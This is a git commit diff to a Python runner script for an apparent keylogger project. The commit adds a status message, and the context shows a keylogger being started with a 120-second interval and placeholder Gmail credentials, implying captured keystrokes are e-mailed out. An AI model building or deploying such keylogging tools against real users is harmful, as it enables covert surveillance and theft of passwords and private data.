505a2f32595872a2f447c631946ec75665426dda
krishna-grayhat <142478625+krishna-grayhat@users.noreply.github.com>
2023-08-28 04:32:16 +0530

    Update Keylogger_run.py

--- Keylogger_run.py
+++ Keylogger_run.py
@@ -2,6 +2,7 @@ import keylogger
 import pyfiglet
 text = pyfiglet.figlet_format("Keylooger")
 print(text)
+print("keylogger is running , please check your e-mail")
 try:
   my_keylogger = keylogger.Keylogger(120, "enter your gmail", "fill your passwd") 
   my_keylogger.start()
